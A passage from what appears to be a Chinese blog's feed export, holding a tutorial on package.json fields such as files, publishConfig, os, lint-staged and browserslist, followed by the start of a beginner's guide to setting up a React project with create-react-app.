node_modules&#x2F;.bin&#x2F;文件中，以便在本项目中使用。</p><p><a name="Fx7sp"></a></p><h3 id="5-files"><a href="#5-files" class="headerlink" title="5. files"></a>5. files</h3><p><code>files</code>配置是一个数组，用来描述当把 npm 包作为依赖包安装时需要说明的文件列表。当 npm 包发布时，<code>files</code>指定的文件会被推送到 npm 服务器中，如果指定的是文件夹，那么该文件夹下面所有的文件都会被提交。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;files&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;LICENSE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Readme.md&quot;</span>,</span><br><span class="line">    <span class="string">&quot;index.js&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lib/&quot;</span></span><br><span class="line"> ]</span><br></pre></td></tr></table></figure><p><br />如果有不想提交的文件，可以在项目根目录中新建一个<code>.npmignore</code>文件，并在其中说明不需要提交的文件，防止垃圾文件推送到 npm 上。这个文件的形式和<code>.gitignore</code>类似。写在这个文件中的文件即便被写在<code>files</code>属性里也会被排除在外。比如可以在该文件中这样写：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">node_modules.<span class="property">vscode</span>;</span><br><span class="line"></span><br><span class="line">build.<span class="property">DS_Store</span>;</span><br></pre></td></tr></table></figure><p><a name="MGYu9"></a></p><h3 id="6-man"><a href="#6-man" class="headerlink" title="6. man"></a>6. man</h3><p><code>man</code> 命令是 Linux 中的帮助指令，通过该指令可以查看 Linux 中的指令帮助、配置文件帮助和编程帮助等信息。如果 node.js 模块是一个全局的命令行工具，在 package.json 通过 <code>man</code> 属性可以指定 <code>man</code> 命令查找的文档地址：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;man&quot;</span>: [</span><br><span class="line"><span class="string">&quot;./man/npm-access.1&quot;</span>,</span><br><span class="line"><span class="string">&quot;./man/npm-audit.1&quot;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><br /><code>man</code> 字段可以指定一个或多个文件, 当执行<code>man &#123;包名&#125;</code>时, 会展现给用户文档内容。</p><p>需要注意：<br />● man 文件必须以数字结尾，如果经过压缩，还可以使用<code>.gz</code>后缀。这个数字表示文件安装到哪个 man 节中；<br />● 如果 man 文件名称不是以模块名称开头的，安装的时候会加上模块名称前缀。</p><p>对于上面的配置，可以使用以下命令来执行查看文档：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">man npm-access</span><br><span class="line">man npm-audit</span><br></pre></td></tr></table></figure><p><a name="iEAAI"></a></p><h3 id="7-directories"><a href="#7-directories" class="headerlink" title="7. directories"></a>7. directories</h3><p><code>directories</code>字段用来规范项目的目录。node.js 模块是基于 CommonJS 模块化规范实现的，需要严格遵循 CommonJS 规范。模块目录下除了必须包含包项目描述文件 package.json 以外，还需要包含以下目录：<br />● <code>bin</code> ：存放可执行二进制文件的目录<br />● <code>lib</code> ：存放 js 代码的目录<br />● <code>doc</code> ：存放文档的目录<br />● <code>test</code> ：存放单元测试用例代码的目录<br />● …</p><p>在实际的项目目录中，我们可能没有按照这个规范进行命名，那么就可以在 directories 字段指定每个目录对应的文件路径：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;directories&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;bin&quot;</span>: <span class="string">&quot;./bin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;lib&quot;</span>: <span class="string">&quot;./lib&quot;</span>,</span><br><span class="line">    <span class="string">&quot;doc&quot;</span>: <span class="string">&quot;./doc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;test&quot;</span> <span class="string">&quot;./test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;man&quot;</span>: <span class="string">&quot;./man&quot;</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p><br />这个属性实际上没有什么实际的作用，当然不排除未来会有什么比较有意义的用处。</p><p><a name="gvSGr"></a></p><h2 id="六、发布配置"><a href="#六、发布配置" class="headerlink" title="六、发布配置"></a>六、发布配置</h2><p>下面来看看和 npm 项目包发布相关的配置。</p><p><a name="Nrz7b"></a></p><h3 id="1-private"><a href="#1-private" class="headerlink" title="1. private"></a>1. private</h3><p><code>private</code>字段可以防止我们意外地将私有库发布到 npm 服务器。只需要将该字段设置为 true：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;private&quot;</span>: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><a name="l3Qyl"></a></p><h3 id="2-preferGlobal"><a href="#2-preferGlobal" class="headerlink" title="2. preferGlobal"></a>2. preferGlobal</h3><p><code>preferGlobal</code>字段表示当用户不把该模块安装为全局模块时，如果设置为 true 就会显示警告。它并不会真正的防止用户进行局部的安装，只是对用户进行提示，防止产生误</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;preferGlobal&quot;</span>: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><strong>3. publishConfig</strong><br /><code>publishConfig</code>配置会在模块发布时生效，用于设置发布时一些配置项的集合。如果不想模块被默认标记为最新，或者不想发布到公共仓库，可以在这里配置 tag 或仓库地址。更详细的配置可以参考 <a href="https://docs.npmjs.com/cli/v7/using-npm/config">npm-config</a>。</p><p>通常情况下，<code>publishConfig</code>会配合<code>private</code>来使用，如果只想让模块发布到特定 npm 仓库，就可以这样来配置：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;private&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="string">&quot;publishConfig&quot;</span>: &#123;</span><br><span class="line">  <span class="string">&quot;tag&quot;</span>: <span class="string">&quot;1.1.0&quot;</span>,</span><br><span class="line">  <span class="string">&quot;registry&quot;</span>: <span class="string">&quot;https://registry.npmjs.org/&quot;</span>,</span><br><span class="line">  <span class="string">&quot;access&quot;</span>: <span class="string">&quot;public&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>4. os</strong><br /><code>os</code>字段可以让我们设置该 npm 包可以在什么操作系统使用，不能在什么操作系统使用。如果我们希望开发的 npm 包只运行在 linux，为了避免出现不必要的异常，建议使用 Windows 系统的用户不要安装它，这时就可以使用 os 配置：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;os&quot;</span>[<span class="string">&quot;linux&quot;</span>]; <span class="comment">// 适用的操作系统</span></span><br><span class="line"><span class="string">&quot;os&quot;</span>[<span class="string">&quot;!win32&quot;</span>]; <span class="comment">// 禁用的操作系统</span></span><br></pre></td></tr></table></figure><p><strong>5. cpu</strong><br />该配置和<code>OS</code>配置类似，用<code>CPU</code>可以更准确的限制用户的安装环境：<br />可以看到，黑名单和白名单的区别就是，黑名单在前面加了一个<code>“!”</code>。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;cpu&quot;</span>[(<span class="string">&quot;x64&quot;</span>, <span class="string">&quot;AMD64&quot;</span>)]; <span class="comment">// 适用的cpu</span></span><br><span class="line"><span class="string">&quot;cpu&quot;</span>[(<span class="string">&quot;!arm&quot;</span>, <span class="string">&quot;!mips&quot;</span>)]; <span class="comment">// 禁用的cpu</span></span><br></pre></td></tr></table></figure><p><strong>6. license</strong><br /><code>license</code> 字段用于指定软件的开源协议，开源协议表述了其他人获得代码后拥有的权利，可以对代码进行何种操作，何种操作又是被禁止的。常见的协议如下：<br />●<code>MIT</code> ：只要用户在项目副本中包含了版权声明和许可声明，他们就可以拿你的代码做任何想做的事情，你也无需承担任何责任。<br />●<code>Apache</code> ：类似于 MIT ，同时还包含了贡献者向用户提供专利授权相关的条款。<br />●<code>GPL</code> ：修改项目代码的用户再次分发源码或二进制代码时，必须公布他的相关修改。</p><p>可以这样来声明该字段：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;license&quot;</span>: <span class="string">&quot;MIT&quot;</span></span><br></pre></td></tr></table></figure><p><a name="mGUqg"></a></p><h2 id="七、第三方配置"><a href="#七、第三方配置" class="headerlink" title="七、第三方配置"></a>七、第三方配置</h2><p><br /><code>package.json</code> 文件还可以承载命令特有的配置，例如 Babel、ESLint 等。它们每个都有特有的属性，例如 <code>eslintConfig</code>、<code>babel </code>等。 它们是命令特有的，可以在相应的命令&#x2F;项目文档中找到如何使用它们。下面来看几个常用的第三方配置项。</p><p><a name="LShKn"></a></p><h3 id="1-typings"><a href="#1-typings" class="headerlink" title="1. typings"></a>1. typings</h3><p><code>typings</code>字段用来指定 TypeScript 的入口文件：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;typings&quot;</span>: <span class="string">&quot;types/index.d.ts&quot;</span>,</span><br></pre></td></tr></table></figure><p>该字段的作用和<code>main</code>配置相同。</p><p><a name="zZigE"></a></p><h3 id="2-eslintConfig"><a href="#2-eslintConfig" class="headerlink" title="2. eslintConfig"></a>2. eslintConfig</h3><p><code>eslint</code>的配置可以写在单独的配置文件<code>.eslintrc.json</code> 中，也可以写在<code>package.json</code>文件的<code>eslintConfig</code>配置项中。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;eslintConfig&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;root&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="string">&quot;env&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;node&quot;</span>: <span class="literal">true</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&quot;extends&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;plugin:vue/essential&quot;</span>,</span><br><span class="line">        <span class="string">&quot;eslint:recommended&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="string">&quot;rules&quot;</span>: &#123;&#125;,</span><br><span class="line">      <span class="string">&quot;parserOptions&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;parser&quot;</span>: <span class="string">&quot;babel-eslint&quot;</span></span><br><span class="line">     &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="bHQ77"></a></p><h3 id="3-babel"><a href="#3-babel" class="headerlink" title="3. babel"></a>3. babel</h3><p><code>babel</code>用来指定 Babel 的编译配置，代码如下：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;babel&quot;</span>: &#123;</span><br><span class="line"><span class="string">&quot;presets&quot;</span>: [<span class="string">&quot;@babel/preset-env&quot;</span>],</span><br><span class="line"><span class="string">&quot;plugins&quot;</span>: [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="IYqpc"></a></p><h3 id="4-unpkg"><a href="#4-unpkg" class="headerlink" title="4. unpkg"></a>4. unpkg</h3><p>使用该字段可以让 npm 上所有的文件都开启 <code>cdn</code> 服务，该 CND 服务由 unpkg 提供：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;unpkg&quot;</span>: <span class="string">&quot;dist/vue.js&quot;</span></span><br></pre></td></tr></table></figure><p><a name="ggWjU"></a></p><h3 id="5-lint-staged"><a href="#5-lint-staged" class="headerlink" title="5. lint-staged"></a>5. lint-staged</h3><p><code>lint-staged</code>是一个在 Git 暂存文件上运行 linters 的工具，配置后每次修改一个文件即可给所有文件执行一次<code>lint</code>检查，通常配合<code>gitHooks</code>一起使用。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;lint-staged&quot;</span>: &#123;</span><br><span class="line"><span class="string">&quot;*.js&quot;</span>: [</span><br><span class="line">  <span class="string">&quot;eslint --fix&quot;</span>,</span><br><span class="line">    <span class="string">&quot;git add&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>lint-staged</code>时，每次提交代码只会检查当前改动的文件。</p><p><a name="ZinRI"></a></p><h3 id="6-gitHooks"><a href="#6-gitHooks" class="headerlink" title="6. gitHooks"></a>6. gitHooks</h3><p><code>gitHooks</code>用来定义一个钩子，在提交（commit）之前执行<code>ESlint</code>检查。在执行<code>lint</code>命令后，会自动修复暂存区的文件。修复之后的文件并不会存储在暂存区，所以需要用<code>git add</code>命令将修复后的文件重新加入暂存区。在执行<code>pre-commit</code>命令之后，如果没有错误，就会执行<code>git commit</code>命令：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;gitHooks&quot;</span>: &#123;</span><br><span class="line"><span class="string">&quot;pre-commit&quot;</span>: <span class="string">&quot;lint-staged&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是配合上面的<code>lint-staged</code>来进行代码的检查操作。</p><p><strong>7. browserslist</strong><br /><code>browserslist</code>字段用来告知支持哪些浏览器及版本。Babel、Autoprefixer 和其他工具会用到它，以将所需的 <code>polyfill</code> 和 <code>fallback</code> 添加到目标浏览器。比如最上面的例子中的该字段值：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;browserslist&quot;</span>: &#123;</span><br><span class="line">  <span class="string">&quot;production&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;&gt;0.2%&quot;</span>,</span><br><span class="line">    <span class="string">&quot;not dead&quot;</span>,</span><br><span class="line">    <span class="string">&quot;not op_mini all&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;development&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;last 1 chrome version&quot;</span>,</span><br><span class="line">    <span class="string">&quot;last 1 firefox version&quot;</span>,</span><br><span class="line">    <span class="string">&quot;last 1 safari version&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里指定了一个对象，里面定义了生产环境和开发环境的浏览器要求。上面的<code>development</code>就是指定开发环境中支持最后一个版本的 chrome、Firefox、safari 浏览器。这个属性是不同的前端工具之间共用目标浏览器和 node 版本的配置工具，被很多前端工具使用，比如<code>Babel</code>、<code>Autoprefixer</code>等</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 工程化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工程化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React 基础入门</title>
      <link href="/2023/07/09/frontend/react/react-ji-chu-ru-men/"/>
      <url>/2023/07/09/frontend/react/react-ji-chu-ru-men/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="lh2Em"></a></p><h2 id="一、开发前的准备"><a href="#一、开发前的准备" class="headerlink" title="一、开发前的准备"></a>一、开发前的准备</h2><p><a name="F1211"></a></p><h3 id="1-开发环境"><a href="#1-开发环境" class="headerlink" title="1. 开发环境"></a>1. 开发环境<br /><br /></h3><p><a name="XL1iW"></a></p><h4 id="（1）Node-js"><a href="#（1）Node-js" class="headerlink" title="（1）Node.js"></a>（1）Node.js</h4><p>Node.js 是一个基于 Chrome V8 引擎的 JavaScript 运行环境。React 应用并不依赖于 Node.js 运行，但是开发过程中的一些编译过程（比如 npm，Webpack 等）都需要在 Node 环境下运行。因此，开发 React 应用前，应确保已经安装了 Node.js。<br><a name="oDLN4"></a></p><h4 id="（2）NPM"><a href="#（2）NPM" class="headerlink" title="（2）NPM"></a>（2）NPM</h4><p>NPM 是 Node 的一个包管理工具，每个包都是一个模块，能够使你轻松下载、管理模块依赖和版本。同样的，在使用 React 开发应用时，会依赖很多模块，这些模块就可以通过 NPM 进行下载。由于 NPM 已集成到了 Node.js 中，因此不用单独下载。<br><a name="LR5hU"></a></p><h3 id="2-开发工具"><a href="#2-开发工具" class="headerlink" title="2. 开发工具"></a>2. 开发工具</h3><p><a name="kEloA"></a></p><h4 id="（1）Webpack"><a href="#（1）Webpack" class="headerlink" title="（1）Webpack"></a>（1）Webpack</h4><p>Webpack 是一个前端资源加载和打包工具。Webpack 提供了模块化的开发方式，将各种静态资源视为模块，如 JavaScript、CSS、图片等，并通过 Webpack 生成优化过的代码。同样在开发 React 应用时也要用到 Webpack 来进行模块打包。<br><a name="VFCJq"></a></p><h4 id="（2）Babel"><a href="#（2）Babel" class="headerlink" title="（2）Babel"></a>（2）Babel</h4><p>Babel 是一个 JavaScript 编译器，主要用于将 ECMAScript 2015+ 版本的代码转换为向后兼容的 JavaScript 语法，以便能够运行在当前和旧版本的浏览器或其他环境中。<br />由于我们在开发 React 应用中，会用到很多 ES6 的语法，但目前浏览器并不完全支持，因此在 Webpack 编译阶段，利用 Babel 将 ES6 及其以后的语法编译成 ES5 语法。<br><a name="JM7aA"></a></p><h3 id="3-开发依赖"><a href="#3-开发依赖" class="headerlink" title="3. 开发依赖"></a>3. 开发依赖</h3><p>开发 React 必须依赖三个库：<br />● <code>react</code>：包含 react 所必须的核心代码<br />● <code>react-dom</code>：react 渲染在不同平台所需要的核心代码<br />● <code>babel</code>：将 jsx 转换成 React 代码的工具</p><p>react-dom 针对 web 和 native 所完成的事情不同：<br />● <code>web端</code>：react-dom 会讲 jsx 最终渲染成真实的 DOM，显示在浏览器中 <br />● <code>native端</code>：react-dom 会讲 jsx 最终渲染成原生的控件（比如 Android 中的 Button，iOS 中的 UIButton）。</p><p><strong>Babel <strong>，又名 <strong>Babel.js，</strong>是目前前端使用非常广泛的编辑器、转移器。比如当下很多浏览器并不支持 ES6 的语法，但是确实 ES6 的语法非常的简洁和方便，我们</strong>开发时</strong>希望使用它。那么编写源码时我们就可以使用 ES6 来编写，之后通过 Babel 工具，将 ES6 转成大多数浏览器都支持的 ES5 的语法。</p><p><code>React</code>和<code>Babel</code>的关系： <br />● 默认情况下开发 React 其实可以不使用 babel。 <br />● 但是前提是我们自己使用 React.createElement 来编写源代码，它编写的代码非常的繁琐和可读性差。 <br />● 那么我们就可以直接编写 jsx（JavaScript XML）的语法，并且让 babel 帮助我们转换成 React.createElement。<br><a name="SWyPE"></a></p><h2 id="二、React-脚手架"><a href="#二、React-脚手架" class="headerlink" title="二、React 脚手架"></a>二、React 脚手架</h2><p>现代的前端项目已经越来越复杂了：<br />● 不会再是在 HTML 中引入几个 css 文件，引入几个编写的 js 文件或者第三方的 js 文件这么简单；<br />● 比如 css 可能是使用 less、sass 等预处理器进行编写，我们需要将它们转成普通的 css 才能被浏览器解析；<br />● 比如 JavaScript 代码不再只是编写在几个文件中，而是通过模块化的方式，被组成在<strong>成百上千</strong>个文件中，我们需要通过模块化的技术来管理它们之间的相互依赖；<br />● 比如项目需要依赖很多的第三方库，如何更好的管理它们（比如管理它们的依赖、版本升级等）；</p><p>为了解决这些问题，前端脚手架就出现了。例如 babel、webpack、gulp 等等，可以通过它们来进行转换规则、打包依赖、热更新等等。总之，<strong>脚手架让项目从搭建到开发，再到部署，整个流程变得快速和便捷。</strong></p><p>目前比较流行的的框架 Vue，它的脚手架是 vue-cli；React 的脚手架就是 create-react-app。它们的作用就是帮助我们生成一个通用的目录结构，并且已经将我们所需的工程环境配置好了。目前，这些脚手架都是使用 node.js 编写的，并且都是基于 Webpack 的，它们需要运行在 Node 环境下。</p><p>上面我们也说到了 NPM 了，它是 Node 的一个包管理工具，每个包都是一个模块，能够使你轻松下载、管理模块依赖和版本。同样的，在使用 React 开发应用时，会依赖很多模块，这些模块就可以通过 NPM 进行下载。由于 NPM 已集成到了 Node.js 中，因此不用单独下载。</p><p>除了 NPM，还有一个比较出名的 Node 包管理工具 yarn，它是为了弥补 NPM 的一些缺陷而出现的，早期的 NPM 存在很多的缺陷，比如按安装依赖速度很慢，版本依赖混乱等等一系列的问题，虽然后面的版本进行了很多的升级和改进，但还是很多人喜欢使用 yarn，React 脚手架也默认使用 yarn。</p><p>安装 yarn：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g yarn</span><br></pre></td></tr></table></figure><p><br />安装好 yarn 就可以使用了，下面来看一下 npm 和 yarn 命令的对照表：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1500604/1605601635296-7ea0eda3-c017-46a3-912d-74ad02b1bfa3.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1500604/1605601635296-7ea0eda3-c017-46a3-912d-74ad02b1bfa3.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>安装完之后，就可以安装 React 的脚手架了：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g create-react-app</span><br></pre></td></tr></table></figure><p><br />安装好之后，可以运行：<code>create-react-app --version</code> 查看版本号，如果版本号正常展示，证明安装成功。<br><a name="hdtBQ"></a></p><h2 id="三、创建-React-项目"><a href="#三、创建-React-项目" class="headerlink" title="三、创建 React 项目"></a>三、创建 React 项目<br /><br /></h2><p>这里我们借助上面所说的的 React 脚手架 <strong>Create React App</strong> 创建 React 应用。该脚手架已经将 Webpack、Babel 等工具的配置做了封装，无需开发者做配置，提供了一个零配置的现代构建。</p><blockquote><p>Create React App 对于开发环境版本有一定的要求，具体如下：<br />npm 版本 &gt;&#x3D; 5.6<br />node 版本 &gt;&#x3D; 8.10</p></blockquote><p>快速搭建 React 应用需要三个步骤：<br />1. 创建 React 项目；<br />2. 启动项目；<br />3. 暴露配置项。</p><p>下面我们就来逐步操作，创建一个 React 项目：<br><a name="qYGKH"></a></p><h3 id="（1）创建-React-项目"><a href="#（1）创建-React-项目" class="headerlink" title="（1）创建 React 项目"></a>（1）创建 React 项目</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create-react-app my-demo</span><br></pre></td></tr></table></figure><blockquote><p>这里项目名不能使用驼峰的形式(即不能包含大写字母)，不然会有以下报错：name can no longer contain capital letters。</p></blockquote><p><a name="sM4sR"></a></p><h3 id="（2）启动项目"><a href="#（2）启动项目" class="headerlink" title="（2）启动项目"></a>（2）启动项目</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd my-demo</span><br><span class="line">npm start</span><br></pre></td></tr></table></figure><p><br />当看到以下界面时，说明你的 React 应用就已经安装好了。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1500604/1605444986314-68a304d5-f153-4032-aa63-25f8043b4706.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1500604/1605444986314-68a304d5-f153-4032-aa63-25f8043b4706.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">├── <span class="variable constant_">README</span>.<span class="property">md</span>                   文档</span><br><span class="line">├── package.<span class="property">json</span>                npm 依赖信息</span><br><span class="line">├── package-lock.<span class="property">json</span>           依赖模块的版本信息</span><br><span class="line">├── .<span class="property">gitignore</span>                  忽略打包的文件</span><br><span class="line">├── public                      静态资源文件夹</span><br><span class="line">│   ├── favicon.<span class="property">ico</span>             网站icon图标</span><br><span class="line">│   ├── index.<span class="property">html</span>              模版</span><br><span class="line">│   ├── logo192.<span class="property">png</span>             <span class="number">192</span>*<span class="number">192</span>大小的react logo</span><br><span class="line">│   ├── logo512.<span class="property">png</span>             <span class="number">512</span>*<span class="number">512</span>大小的react logo</span><br><span class="line">│   ├── manifest.<span class="property">json</span>           移动桌面快捷方式配置文件</span><br><span class="line">│   └── robots.<span class="property">txt</span>              网站与爬虫间的协议</span><br><span class="line">├── src                         源码文件夹</span><br><span class="line">│   ├── <span class="title class_">App</span>.<span class="property">css</span></span><br><span class="line">│   ├── <span class="title class_">App</span>.<span class="property">js</span>                  根组件</span><br><span class="line">│   ├── <span class="title class_">App</span>.<span class="property">test</span>.<span class="property">js</span></span><br><span class="line">│   ├── index.<span class="property">css</span>               全局样式</span><br><span class="line">│   ├── index.<span class="property">js</span>                入口文件</span><br><span class="line">│   ├── logo.<span class="property">svg</span></span><br><span class="line">│   └── serviceWorker.<span class="property">js</span>        <span class="variable constant_">PWA</span> 支持</span><br><span class="line">└── node_modules                依赖包</span><br></pre></td></tr></table></figure><p><br />在 src 文件夹有一个<code>serviceWorker.js</code> 文件，在 public 文件有一个<code>manifest.json</code>文件，他们涉及到了一个知识点——PWA，PWA 全称为 Progressive Web App，即渐进式 WEB 应用；一个 PWA 应用首先是一个网页, 可以通过 Web 技术编写出一个网页应用；添加上 App Manifest 和 Service Worker 来实现 PWA 的安装和离线等功能；这种 Web 存在的形式，我们也称之为是 <code>Web App</code>。</p><p>PWA 解决了哪些问题呢？<br />● 可以添加至主屏幕，点击主屏幕图标可以实现启动动画以及隐藏地址栏； <br />● 实现离线缓存功能，即使用户手机没有网络，依然可以使用一些离线功能； <br />● 实现了消息推送； <br />还有类似一系列类似于 Native App 相关的功能。</p><p><a name="OEA4n"></a></p><h3 id="（3）暴露配置项"><a href="#（3）暴露配置项" class="headerlink" title="（3）暴露配置项"></a>（3）暴露配置项</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run eject</span><br></pre></td></tr></table></figure><p>在初始化好的项目中，<code>Webpack</code>等配置默认都是隐藏的，要想看到这些配置，就要执行以上命令来暴露项目的配置项。</p><p>暴露配置项之后，项目根目录又多出两个文件：<code>scripts</code>和<code>config</code>，他们都是被隐藏的配置项，同时<code>package.json</code>中的配置项也会变多，一些隐藏的配置项都暴露了出来。<br><a name="wO63i"></a></p><h2 id="四、React-初体验"><a href="#四、React-初体验" class="headerlink" title="四、React 初体验"></a>四、React 初体验<br /><br /></h2><p>下面我们就来用 react 实现一下 Hello World：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">打开 src/index.<span class="property">js</span> 文件，可以看到 render 的模版是 <span class="title class_">App</span>.<span class="property">js</span>，代码如下：</span><br><span class="line"></span><br><span 